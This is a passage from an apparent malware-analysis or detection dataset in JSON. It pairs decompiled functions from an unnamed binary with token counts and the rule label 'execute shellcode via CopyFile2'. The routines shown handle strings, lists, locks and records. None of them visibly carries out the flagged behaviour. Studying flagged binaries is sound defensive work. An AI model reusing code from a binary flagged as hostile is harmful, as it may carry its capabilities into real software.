 if (iVar6 == 0) break;\n                    iVar6 = iVar6 + -1;\n                    iVar1 = *piVar8;\n                    piVar8 = piVar8 + 1;\n                } while (iVar1 != 0);\n                *piVar4 = ~iVar6 * 2;\n                piVar8 = *arg1;\n                do {\n                    iVar1 = *piVar8;\n                    piVar8 = piVar8 + 1;\n                    *piVar7 = iVar1;\n                    piVar7 = piVar7 + 1;\n                } while (iVar1 != 0);\n                piVar4[6] = 0x1e;\n                piVar7 = aiStack72;\n                *(piVar4 + 8) = piVar4 + 0x2a;\n                uVar2 = *(arg1 + 5);\n                piVar8 = 0x64004;\n                iVar6 = 0xe;\n                do {\n                    if ((*(piVar8 + -2) & uVar2) == 0) {\n                        *piVar7 = 0x2d;\n                    }\n                    else {\n                        *piVar7 = *piVar8;\n                    }\n                    piVar8 = piVar8 + 4;\n                    piVar7 = piVar7 + 1;\n                    iVar6 = iVar6 + -1;\n                } while (iVar6 != 0);\n                uStack44 = 0;\n                piVar7 = aiStack72;\n                do {\n                    iVar1 = *piVar7;\n                    *(((piVar4 + 0x2a) - aiStack72) + piVar7) = iVar1;\n                    piVar7 = piVar7 + 1;\n                } while (iVar1 != 0);\n                *(piVar4 + 0xe) = piVar4 + 0x10;\n                piVar4[0xc] = 4;\n                piVar4[0x10] = *(arg1 + 6);\n                piVar4[0x12] = 4;\n                *(piVar4 + 0x14) = piVar4 + 0x16;\n                piVar4[0x16] = *(arg1 + 2);\n                piVar4[0x18] = 4;\n                *(piVar4 + 0x1a) = piVar4 + 0x1c;\n                piVar4[0x1c] = *(arg1 + 3);\n                piVar4[0x1e] = 4;\n                *(piVar4 + 0x20) = piVar4 + 0x22;\n                piVar4[0x22] = *(arg1 + 1);\n                piVar4[0x24] = 4;\n                *(piVar4 + 0x26) = piVar4 + 0x28;\n                piVar4[0x28] = *(arg1 + 4);\n                *arg2 = piVar4;\n                if (in_stack_00000028 != NULL) {\n                    *in_stack_00000028 = *in_stack_00000028 + arg1[6];\n                }\n                return 0;\n            }\n        }\n        uVar3 = 0xc000009a;\n    }\n    return uVar3;\n}\n",
        "token_count": 1074
    },
    "000199d4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.000199d4(void)\n\n{\n    uint64_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    uint64_t uVar7;\n    int64_t *piVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    char *pcVar12;\n    int64_t iVar13;\n    int64_t iVar14;\n    uint32_t uVar15;\n    uint64_t uVar17;\n    bool bVar18;\n    char acStack136 [16];\n    int32_t aiStack120 [8];\n    int32_t iStack88;\n    uint64_t uVar16;\n    \n    uVar11 = 0;\n    if (*0x78b30 != '\\0') {\n        LOCK();\n        bVar18 = *0x78b60 == 0;\n        *0x78b60 = *0x78b60 ^ bVar18 * (*0x78b60 ^ 1);\n        if (bVar18) {\n            iVar5 = fcn.00061a92(0xffffffffffffffff, 0, aiStack120, 0x30, 0);\n            if (((((iVar5 == 0) && (aiStack120[0] == 0x103)) && (iStack88 != 0)) &&\n                ((iStack88 != *(*0x64080 + 0x1c) && (iVar5 = fcn.00030f70(acStack136, 0x10),  iVar5 != 0)))) &&\n               (iVar5 = fcn.0002f260(0x78b40),  iVar5 != 0)) {\n                piVar8 = 0x78ba8;\n                uVar10 = uVar11;\n                uVar16 = uVar11;\n                do {\n                    uVar15 = uVar16;\n                    if ((*(piVar8 + -0x17) != '\\0') && (*(piVar8 + -3) != '\\0')) {\n                        uVar7 = 0xffffffffffffffff;\n                        pcVar12 = acStack136;\n                        do {\n                            if (uVar7 == 0) break;\n                            uVar7 = uVar7 - 1;\n                            cVar3 = *pcVar12;\n                            pcVar12 = pcVar12 + 1;\n                        } while (cVar3 != '\\0');\n                        iVar13 = piVar8[-8] + -1;\n                        if (iVar13 != 0) {\n                            do {\n                                iVar13 = iVar13 + 1;\n                                cVar3 = *((~uVar7 - 1) + iVar13);\n                                if (((cVar3 == ',') || (cVar3 == '\\0')) &&\n                                   (iVar5 = fcn.00061a8c(acStack136, iVar13, ~uVar7 - 1 & 0xffffffff),  iVar5 == 0))\n                                break;\n                                iVar13 = fcn.00061a86();\n                            } while (iVar13 != 0);\n                            uVar7 = 0;\n                            if (iVar13 != 0) {\n                                iVar13 = 0;\n                                uVar9 = 0;\n                                uVar17 = uVar7;\n                                if (*(piVar8 + -1) != 0) {\n                                    do {\n                                        uVar9 = uVar7;\n                                        if ((*(iVar13 + 0x14 + *piVar8) != 0) &&\n                                           (iVar5 = fcn.00031510(0x78b48, 1),  iVar5 != 0)) {\n                                            fcn.000619f6(uVar7 * 0x30 + *(uVar16 * 0x48 + 0x78ba8), \n                                                         (uVar9 + 1) * 0x30 + *(uVar16 * 0x48 + 0x78ba8), \n                                                         ((*(uVar16 * 0x48 + 0x78ba0) - uVar9) - 1) * 0x30);\n                                            uVar15 = *(uVar16 * 0x48 + 0x78ba0);\n                                            uVar11 = uVar15 * 0x30;\n                                            uVar10 = (uVar15 - 1) * 0x30;\n                                            if (uVar10 == 0) {\n                                                fcn.0002fc50(*(uVar16 * 0x48 + 0x78ba8));\n                                                *(uVar16 * 0x48 + 0x78ba8) = 0;\n                                            }\n                                            else {\n                                                iVar13 = fcn.0002fbc4(uVar10);\n                                                if (iVar13 != 0) {\n                                                    if (uVar10 < uVar11) {\n                                                        uVar11 = uVar10;\n                                                    }\n                                                    fcn.000619f6(iVar13, *(uVar16 * 0x48 + 0x78ba8), uVar11);\n                                                    fcn.0002fc50(*(uVar16 * 0x48 + 0x78ba8));\n                                                    *(uVar16 * 0x48 + 0x78ba8) = iVar13;\n                                                }\n                                            }\n                                            piVar2 = uVar16 * 0x48 + 0x78ba0;\n                                            *piVar2 = *piVar2 + -1;\n                                            fcn.000314ec(0x78b48, 1);\n                                            fcn.0002f2a4(0x78b40);\n                                            goto code_r0x00019c63;\n                                        }\n                                        if (*(iVar13 + 8 + *piVar8) == iStack88) break;\n                                        uVar9 = uVar9 + 1;\n                                        uVar7 = uVar9;\n                                        uVar17 = uVar17 + 1;\n                                        iVar13 = iVar13 + 0x30;\n                                    } while (uVar9 < *(piVar8 + -1));\n                                }\n                                uVar4 = *(piVar8 + -1);\n                                if (uVar9 < uVar4) {\n                                    iVar13 = *piVar8;\n                                    uVar10 = uVar9 * 0x30 + iVar13;\n                                    if (((*(iVar13 + 0x18 + uVar17 * 0x30) == 0) &&\n                                        (*(iVar13 + 0xc + uVar17 * 0x30) == 0)) &&\n                                       ((*(iVar13 + 0x10 + uVar17 * 0x30) == 0 &&\n                                        (iVar13 = fcn.00030130(0),  0x13 < iVar13 - *(*piVar8 + uVar17 * 0x30))))) {\n                                        if (*(piVar8 + -0x16) != '\\0') {\n                                            LOCK();\n                                            puVar1 = uVar16 * 0x48 + 0x78b98;\n                                            uVar7 = *puVar1;\n                                            *puVar1 = *puVar1 ^ (uVar7 == 0) * *puVar1;\n                                            if (0 < (uVar7 != 0) * *puVar1) goto code_r0x00019d30;\n                                        }\n                                        if ((piVar8[-4] == 0) || (iVar5 = fcn.00019244(piVar8[-4]),  iVar5 != 0)) {\n                                            LOCK();\n                                            piVar8 = uVar16 * 0x48 + 0x78b98;\n                                            *piVar8 = *piVar8 + 1;\n                                            fcn.000313f0(0x78b48, 0);\n                                            uVar11 = uVar16 * 0x48 + 0x78b68;\n                                            *(uVar10 + 0xc) = 1;\n                                            break;\n                                        }\n                                    }\n                                }\n                                else {\n                                    iVar14 = uVar4 * 0x30;\n                                    iVar13 = (uVar4 + 1) * 0x30;\n                                    if (iVar13 == 0) {\n                                        fcn.0002fc50(*piVar8);\n                                        *piVar8 = 0;\n                                    }\n                                    else {\n                                        iVar13 = fcn.0002fbc4(iVar13);\n                                        if (iVar13 == 0) goto code_r0x00019d30;\n                                        fcn.000619f6(iVar13, *piVar8);\n                                        fcn.0002fc50(*piVar8);\n                                        *piVar8 = iVar13;\n                                    }\n                                    *(iVar14 + 8 + *piVar8) = iStack88;\n                                    *(iVar14 + 0x18 + *piVar8) = 0;\n                                    uVar6 = fcn.00030130(0);\n                                    *(iVar14 + *piVar8) = uVar6;\n                                    *(iVar14 + 0xc + *piVar8) = 0;\n                                    *(iVar14 + 0x10 + *piVar8) = 0;\n                                    *(iVar14 + 0x14 + *piVar8) = 0;\n                                    *(iVar14 + 0x20 + *piVar8) = 0;\n                                    *(iVar14 + 0x28 + *piVar8) = 0;\n                                    *(piVar8 + -1) = *(piVar8 + -1) + 1;\n                                }\n                            }\n                        }\n                    }\ncode_r0x00019d30:\n                    uVar15 = uVar15 + 1;\n                    uVar16 = uVar15;\n                    piVar8 = piVar8 + 9;\n                } while (uVar15 < 0x32);\n                fcn.0002f2a4(0x78b40);\n                if ((uVar15 < 0x32) && (iVar5 = fcn.00019290(uVar11, uVar10, 0x19610),  iVar5 != 0)) {\n                    *(uVar10 + 0xc) = 0;\n                    fcn.000314ec(0x78b48, 0);\n                }\n            }\ncode_r0x00019c63:\n            LOCK();\n            *0x78b60 = *0x78b60 - 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 2255
    },
    "0001a25c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001a3e6)\n\nuint64_t fcn.0001a25c(ulong arg1, uint64_t arg2, ulong noname_2, code *arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint64_t arg1_00;\n    char acStackX8 [24];\n    int64_t iStackX32;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint64_t in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iVar6;\n    int64_t iStack80;\n    uint64_t uStack72;\n    uint64_t uStack64;\n    \n    iVar6 = CONCAT44(in_stack_0000002c, in_stack_00000028);\n    arg1_00 = arg1;\n    iStackX32 = 0;\n    puVar5 = -(iVar6 != 0) & in_stack_00000030;\n    if (arg4 == NULL) {\n        arg4 = fcn.0001a254;\n    }\n    uStack64 = arg2 & 0xffffffff;\n    uStack72 = arg1_00;\n    uVar3 = (**0x111d8)(&uStack72, 0);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    iVar4 = fcn.0002fbf0(0x58);\n    if (iVar4 == 0) {\n        uVar2 = 0xc0000017;\n    }\n    else {\n        uVar2 = fcn.0001a178(arg1_00, acStackX8);\n        if (uVar2 == 0) {\n            if (acStackX8[0] != '\\0') {\n                uVar2 = fcn.0004c36c(arg1, 0x11a78);\n                if ((uVar2 != 0) || (uVar2 = fcn.0004e868(arg1_00, 0, 0x11a68, &iStack80),  uVar2 != 0))\n                goto code_r0x0001a3dc;\n                in_stack_00000028 = SUB84(puVar5, 0);\n                arg4 = fcn.0001a254;\n                iVar6 = iStack80;\n                puVar5 = &stack0x00000028;\n            }\n            (**0x111d0)(iVar4, iStackX32, 0, arg4, 0, iVar6, noname_2, puVar5);\n            cVar1 = (**0x111c8)(iVar4, in_stack_00000038, 0, 0);\n            uVar2 = ~-(cVar1 != '\\0') & 0xc0000001;\n        }\n    }\ncode_r0x0001a3dc:\n    if (iStackX32 != 0) {\n        (*_fcn.000115b0)();\n    }\n    if ((uVar2 != 0) && (iVar4 != 0)) {\n        (**0x111c0)(iVar4, 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 728
    },
    "0001dacc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0001dacc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    ulong uStack120;\n    ulong uStack112;\n    char acStack104 [96];\n    \n    uStack120 = 0x11cd0;\n    uStack112 = 0;\n    fcn.000288f8(acStack104, 0x52);\n    iVar3 = -1;\n    pcVar4 = acStack104;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.00060b2c(0x79f18, &uStack120, acStack104, ~iVar3);\n    if (iVar2 == 0) {\n        fcn.00060f4c(*0x79f18, 0x1cd8c, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "0001f820": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0001f820(uint64_t *arg1, ulong arg2, char *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint64_t auStackX24 [2];\n    uint32_t in_stack_00000028;\n    uchar auStack184 [144];\n    \n    if (arg2 < 8) {\n        auStackX24[0] = 0;\n        fcn.000619f6(auStackX24, arg1, arg2);\n    }\n    else {\n        auStackX24[0] = *arg1;\n    }\n    auStackX24[0] = auStackX24[0] & 0xffffffff00000000 | auStackX24[0] ^ in_stack_00000028;\n    if (in_stack_00000028 != 0) {\n        fcn.0002c248(auStack184, arg2, arg1);\n        fcn.0002bc38(arg4, arg3 + 1, in_stack_00000028, auStack184);\n    }\n    iVar1 = (-((in_stack_00000028 & 7) != 0) & 8) + (in_stack_00000028 & 0xfffffff8);\n    *arg3 = iVar1 - in_stack_00000028;\n    return iVar1 + 1;\n}\n",
        "token_count": 307
    },
    "00020184": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00020184(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    int32_t iVar8;\n    uchar auStack184 [48];\n    uint32_t uStack136;\n    uint32_t uStack132;\n    uint32_t uStack128;\n    uint32_t uStack92;\n    \n    iVar3 = 0;\n    iVar4 = 0;\n    iVar8 = 0;\n    if (arg1 == 0) {\n        return -1;\n    }\n    fcn.0001fd9c(arg1);\n    fcn.000619f6(auStack184, arg1 + 8, 0x2c);\n    uVar6 = *(arg1 + 8);\n    if (uVar6 <= *(arg1 + 0x1c) && *(arg1 + 0x1c) != uVar6) {\n        *(arg1 + 0x1c) = uVar6;\n        iVar2 = (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), arg1 + 8, 0x2c);\n        if (iVar2 != 0) goto code_r0x00020354;\n    }\n    uVar7 = 0x2c;\n    uVar6 = 0x2c;\n    if (0x2c < *(arg1 + 0x1c)) {\n        do {\n            uVar6 = uVar7;\n            iVar2 = (**(*(arg1 + 0x58) + 0x28))(*(arg1 + 0x60), &uStack136);\n            if (iVar2 != 0) goto code_r0x00020354;\n            if (((*(arg1 + 0x1c) < uVar7 + 0x40) || (uVar1 = uStack92 + 0x40 + uVar7,  uVar1 <= uVar7)) ||\n               (*(arg1 + 0x1c) < uVar1)) break;\n            if (uStack128 == 0xffff) {\n                iVar4 = iVar4 + 1;\n            }\n            else {\n                iVar8 = iVar8 + 1;\n                for (puVar5 = *(arg1 + 0x38); puVar5 != NULL; puVar5 = *(puVar5 + 8)) {\n                    if ((*puVar5 == uStack136) && (puVar5[1] == uStack128)) {\n                        if (puVar5[3] <= uStack132 && uStack132 != puVar5[3]) {\n                            puVar5[3] = uStack132;\n                        }\n                        if (uStack132 < puVar5[2]) {\n                            puVar5[2] = uStack132;\n                        }\n                        goto code_r0x000202c2;\n                    }\n                }\n                fcn.0001fe20(arg1, uStack136, uStack128, uStack132);\ncode_r0x000202c2:\n                iVar3 = fcn.0001fee4(arg1, uStack136, uStack128, uStack132);\n                if (iVar3 != 0) goto code_r0x00020359;\n            }\n            uVar6 = uVar6 + 0x40 + uStack92;\n            uVar7 = uVar6;\n        } while (uVar6 < *(arg1 + 0x1c));\n    }\n    *(arg1 + 0x1c) = uVar6;\n    *(arg1 + 0x18) = iVar8;\n    *(arg1 + 0x20) = iVar4;\n    iVar4 = fcn.00061a80(arg1 + 8, auStack184, 0x2c, 1, 1);\n    if (iVar4 == 0) {\n        return iVar3;\n    }\n    *(arg1 + 0x2c) = *(arg1 + 0x2c) + 1;\n    iVar4 = (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), arg1 + 8, 0x2c, 0);\n    if (iVar4 == 0) {\n        return iVar3;\n    }\ncode_r0x00020354:\n    iVar3 = 3;\ncode_r0x00020359:\n    fcn.000619f6(arg1 + 8, auStack184, 0x2c);\n    return iVar3;\n}\n",
        "token_count": 1030
    },
    "0002041c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.0002041c(int64_t arg1)\n\n{\n    uint32_t *arg2;\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack60;\n    \n    uVar3 = 0x2c;\n    iVar1 = 0;\n    (**(*(arg1 + 0x58) + 0x38))(*(arg1 + 0x60), 2);\n    puVar2 = *(arg1 + 0x40);\n    while (puVar2 != NULL) {\n        puVar4 = *(puVar2 + 10);\n        iVar1 = (**(*(arg1 + 0x58) + 0x28))(*(arg1 + 0x60), &uStack104);\n        if (iVar1 != 0) goto code_r0x00020616;\n        puVar2[3] = uVar3;\n        if (((*puVar2 == uStack100) && (puVar2[1] == uStack60)) && (puVar2[2] == uStack92)) {\n            arg2 = *(puVar2 + 0xc);\n            if ((*arg2 != uStack104) || (arg2[1] != uStack96)) {\n                if (uStack96 == 0xffff) {\n                    if (uStack104 != *arg2) goto code_r0x00020616;\n                    fcn.00020034(arg1, arg2, *puVar2, 0);\n                }\n                else {\n                    if (uStack104 != *arg2) goto code_r0x00020616;\n                    fcn.00020034(arg1, arg2, uStack100, 0);\n                    iVar1 = fcn.0001fee4(arg1, uStack104, uStack96, uStack100);\n                    if (iVar1 != 0) goto code_r0x00020616;\n                    for (puVar2 = *(arg1 + 0x38); puVar2 != NULL; puVar2 = *(puVar2 + 8)) {\n                        if ((*puVar2 == uStack104) && (puVar2[1] == uStack96)) goto code_r0x0002054b;\n                    }\n                    puVar2 = NULL;\ncode_r0x0002054b:\n                    fcn.0001fe7c(puVar2);\n                }\n            }\n        }\n        else {\n            puVar4 = puVar2;\n            if (uStack96 != 0xffff) goto code_r0x00020616;\n        }\n        uVar3 = uVar3 + 0x40 + uStack60;\n        puVar2 = puVar4;\n    }\n    for (; uVar3 < *(arg1 + 0x1c); uVar3 = uVar3 + 0x40 + uStack60) {\n        iVar1 = (**(*(arg1 + 0x58) + 0x28))(*(arg1 + 0x60));\n        if (iVar1 != 0) goto code_r0x00020616;\n        if (uStack96 != 0xffff) {\n            iVar1 = fcn.0001fee4(arg1, uStack104, uStack96, uStack100);\n            if (iVar1 != 0) goto code_r0x00020616;\n            for (puVar2 = *(arg1 + 0x38); puVar2 != NULL; puVar2 = *(puVar2 + 8)) {\n                if ((*puVar2 == uStack104) && (puVar2[1] == uStack96)) goto code_r0x000205fa;\n            }\n            puVar2 = NULL;\ncode_r0x000205fa:\n            fcn.0001fe7c(puVar2);\n        }\n    }\ncode_r0x00020620:\n    (**(*(arg1 + 0x58) + 0x38))(*(arg1 + 0x60), 1);\n    return iVar1;\ncode_r0x00020616:\n    iVar1 = fcn.00020184(arg1);\n    goto code_r0x00020620;\n}\n",
        "token_count": 950
    },
    "00020b24": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00020b24(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t *arg1_00;\n    uint32_t uVar4;\n    int64_t iStack136;\n    uchar auStack128 [24];\n    uchar auStack104 [48];\n    uint uStack56;\n    \n    uVar4 = 5;\n    uVar3 = fcn.00020640(&iStack136, arg1, 5, auStack128);\n    if (uVar3 == 0) {\n        if ((*(iStack136 + 0x90) != 0) && (arg2 == *(iStack136 + 0x94))) {\n            arg2._0_4_ = *(iStack136 + 0x98);\n        }\n        for (arg1_00 = *(iStack136 + 0x38); (arg1_00 != NULL && ((*arg1_00 != arg2 || (arg1_00[1] != arg3))));\n            arg1_00 = *(arg1_00 + 8)) {\n        }\n        iVar1 = fcn.00020000(arg1_00, arg4);\n        if (iVar1 != -1) {\n            iVar2 = (**(*(iStack136 + 0x58) + 0x28))(*(iStack136 + 0x60), auStack104, 0x40, iVar1);\n            if (iVar2 == 0) {\n                uStack56 = 0;\n                iVar1 = (**(*(iStack136 + 0x58) + 0x30))(*(iStack136 + 0x60), auStack104, 0x40, iVar1);\n                uVar4 = -(iVar1 != 0) & 3;\n            }\n            else {\n                uVar4 = 3;\n            }\n        }\n        fcn.0001feb8(auStack128);\n        uVar3 = uVar4;\n    }\n    return uVar3;\n}\n",
        "token_count": 460
    },
    "00020c04": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00020c04(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t *arg1_00;\n    uint32_t uVar4;\n    uint32_t in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t iStack136;\n    uchar auStack128 [24];\n    uchar auStack104 [16];\n    uint auStack88 [12];\n    \n    if (in_stack_00000028 < 4) {\n        uVar4 = 5;\n        uVar3 = fcn.00020640(&iStack136, arg1, 5, auStack128);\n        if (uVar3 == 0) {\n            if ((*(iStack136 + 0x90) != 0) && (arg2 == *(iStack136 + 0x94))) {\n                arg2._0_4_ = *(iStack136 + 0x98);\n            }\n            for (arg1_00 = *(iStack136 + 0x38); (arg1_00 != NULL && ((*arg1_00 != arg2 || (arg1_00[1] != arg3))));\n                arg1_00 = *(arg1_00 + 8)) {\n            }\n            iVar1 = fcn.00020000(arg1_00, arg4);\n            if (iVar1 != -1) {\n                iVar2 = (**(*(iStack136 + 0x58) + 0x28))(*(iStack136 + 0x60), auStack104, 0x40, iVar1);\n                if (iVar2 == 0) {\n                    auStack88[in_stack_00000028] = in_stack_00000030;\n                    iVar1 = (**(*(iStack136 + 0x58) + 0x30))(*(iStack136 + 0x60), auStack104, 0x40, iVar1);\n                    uVar4 = -(iVar1 != 0) & 3;\n                }\n                else {\n                    uVar4 = 3;\n                }\n            }\n            fcn.0001feb8(auStack128);\n            uVar3 = uVar4;\n        }\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 523
    },
    "00020edc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t * fcn.00020edc(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t *arg1_00;\n    uint32_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    int64_t iStack168;\n    uchar auStack160 [24];\n    uchar auStack136 [4];\n    uint32_t uStack132;\n    \n    puVar2 = fcn.00020640(&iStack168, arg1, 1, auStack160);\n    puVar5 = NULL;\n    uVar4 = 0;\n    if (puVar2 != 0) {\n        return puVar2;\n    }\n    if ((*(iStack168 + 0x90) != 0) && (arg2 == *(iStack168 + 0x94))) {\n        arg2._0_4_ = *(iStack168 + 0x98);\n    }\n    for (puVar2 = *(iStack168 + 0x38);\n        (arg1_00 = puVar5,  puVar2 != NULL && ((*puVar2 != arg2 || (arg1_00 = puVar2,  puVar2[1] != arg3))));\n        puVar2 = *(puVar2 + 8)) {\n    }\n    if ((arg1_00 == NULL) || (iVar1 = fcn.00020000(arg1_00, arg4),  iVar1 == -1)) {\n        puVar5 = 0x5;\n    }\n    else {\n        iVar1 = (**(*(iStack168 + 0x58) + 0x28))(*(iStack168 + 0x60), auStack136, 0x40, iVar1);\n        if (iVar1 == 0) {\n            for (puVar2 = *(iStack168 + 0x38);\n                (puVar3 = puVar5,  puVar2 != NULL &&\n                ((*puVar2 != arg2 || (puVar3 = puVar2,  puVar2[1] != in_stack_00000028)))); puVar2 = *(puVar2 + 8)) {\n            }\n            if (puVar3 != NULL) {\n                uVar4 = puVar3[3];\n            }\n            uStack132 = uVar4 + 1;\n            *in_stack_00000030 = uStack132;\n            iVar1 = (**(*(iStack168 + 0x58) + 0x30))(*(iStack168 + 0x60), auStack136);\n            if (iVar1 == 0) {\n                fcn.00020034(iStack168, arg1_00, arg4, 0);\n                fcn.0001fee4(iStack168, arg2, in_stack_00000028, uStack132);\n                goto code_r0x00021039;\n            }\n        }\n        puVar5 = 0x3;\n    }\ncode_r0x00021039:\n    fcn.0001feb8(auStack160);\n    return puVar5;\n}\n",
        "token_count": 715
    },
    "00021ccc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00021ccc(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint32_t in_stack_00000028;\n    uint in_stack_0000002c;\n    int32_t in_stack_00000030;\n    uchar auStack72 [24];\n    \n    if ((CONCAT44(in_stack_0000002c, in_stack_00000028) == 0) && (in_stack_00000030 != 0)) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = fcn.00020640(0, arg1, 5, auStack72);\n        if (uVar2 == 0) {\n            uVar1 = fcn.00021b00(arg1, arg2, arg3, arg4);\n            uVar2 = uVar1;\n            if (uVar1 == 0) {\n                uVar1 = fcn.000211a0(arg1, arg2, arg3, in_stack_00000028);\n                uVar2 = uVar1;\n                if (uVar1 != 0) {\n                    fcn.00020d04(arg1, arg2, arg3, in_stack_00000028);\n                }\n            }\n            fcn.0001feb8(auStack72);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 316
    },
    "00022fa0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.00022fa0(uchar *arg1, ulong arg2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack2456 [16];\n    uchar auStack2440 [16];\n    uint32_t uStack2424;\n    uchar auStack2376 [259];\n    uchar uStack2117;\n    uchar auStack2104 [2048];\n    \n    bVar4 = false;\n    bVar5 = false;\n    bVar7 = false;\n    bVar2 = false;\n    if (*0x7a350 != 0) {\n        return 0x21590064;\n    }\n    *0x88b70 = 0;\n    fcn.00061b0a(0x88ba0, arg1, 0x104);\n    *0x88b80 = arg2;\n    fcn.00061b0a(auStack2376, arg1);\n    uStack2117 = 0;\n    puVar9 = fcn.00061b04(auStack2376);\n    if (puVar9 == NULL) {\n        aiStackX24[0] = -1;\n    }\n    else {\n        *puVar9 = 0;\n        aiStackX24[0] = fcn.00030174(puVar9 + 1, 0, 0);\n        arg1 = auStack2376;\n    }\n    fcn.00022a74(arg1, 0x11eac, 1);\n    iVar8 = fcn.000222d0(arg1, 1);\n    if (iVar8 == 0) {\n        if (aiStackX24[0] == -1) {\n            iVar8 = 0;\ncode_r0x000230dd:\n            if (iVar8 != 0) goto code_r0x00023101;\n        }\n        else {\n            iVar8 = fcn.00021828(0xfffffffe, 0xb, aiStackX24, auStack2440);\n            if (iVar8 != 0) {\n                fcn.00021a18();\n                if (aiStackX24[0] != 1) {\n                    uVar10 = iVar8 + 0x191U | 0x21590000;\n                    bVar1 = bVar2;\n                    bVar3 = bVar5;\n                    bVar6 = bVar7;\n                    goto code_r0x00023234;\n                }\n                goto code_r0x000230dd;\n            }\n            fcn.00021aa0(0xfffffffe, uStack2424);\n        }\n        iVar8 = fcn.000265bc(auStack2456, 0x10, 0x229);\n        if (iVar8 != 0) {\n            fcn.00021a18();\n            goto code_r0x00023101;\n        }\n        uVar10 = 0;\ncode_r0x00023195:\n        fcn.00026e2c(8, 0, uVar10, 0);\n        fcn.00026a28(5, 0x79f20, 0x20, auStackX32);\n        fcn.00029804();\n        fcn.00022504(auStack2104, 0x800);\n        uVar10 = fcn.0005f848(auStack2104);\n        bVar1 = false;\n        if (uVar10 == 0) {\n            bVar4 = true;\n            uVar10 = fcn.0005cbfc();\n            bVar1 = bVar2;\n            if (uVar10 == 0) {\n                bVar1 = true;\n                uVar10 = fcn.00022d5c(arg2);\n                if (uVar10 == 0) {\n                    *0x7a350 = 1;\n                }\n            }\n        }\n        fcn.00026e2c(9, 0, uVar10, 0);\n        bVar3 = bVar4;\n        bVar6 = true;\n    }\n    else 